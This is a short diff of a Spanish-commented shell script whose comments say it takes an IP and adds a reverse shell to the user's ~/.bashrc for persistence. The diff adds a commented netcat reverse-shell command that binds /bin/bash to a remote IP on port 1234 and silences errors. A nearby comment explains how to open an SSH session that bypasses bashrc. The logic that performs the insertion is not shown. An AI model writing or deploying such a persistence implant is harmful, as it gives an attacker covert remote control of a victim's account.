@@ -2,7 +2,8 @@
 
 #Para entrar sin bashrc a una sesion:
 #ssh -t usuario@HOST 'bash --noprofile --norc -i'
-
+#original era:
+#nc -e /bin/bash IP 1234 2>/dev/null &
 
 # Uso: ./script.sh <IP>
 # Agrega la reverse shell a ~/.bashrc
